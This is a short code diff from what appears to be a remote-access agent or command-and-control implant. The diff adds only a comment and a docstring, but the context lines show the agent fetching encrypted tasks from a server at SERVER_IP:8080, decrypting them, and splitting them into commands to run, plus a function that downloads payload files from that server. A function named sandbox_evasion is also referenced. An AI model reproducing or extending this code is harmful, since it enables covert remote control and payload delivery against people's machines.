@@ -162,7 +162,10 @@ def download_and_run_commands():
         url = 'http://{0}:8080/agent_tasks/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
+
+        # Decrypt instructions
         response = symmetric_cipher(response, encrypt=False)
+
         if req.status == 200:
             results = []
             agent_commands = response.split('++')
@@ -295,6 +298,11 @@ def sandbox_evasion():
 
 
 def download(file_path):
+    """
+    Downloads a file to the disk from the local agent server.
+    :param file_path:
+    :return:
+    """
     url = 'http://{0}:8080{1}'.format(SERVER_IP, file_path)
     req = http.request('GET', url, headers=headers)
     payload = file_path.split("/")[-1]
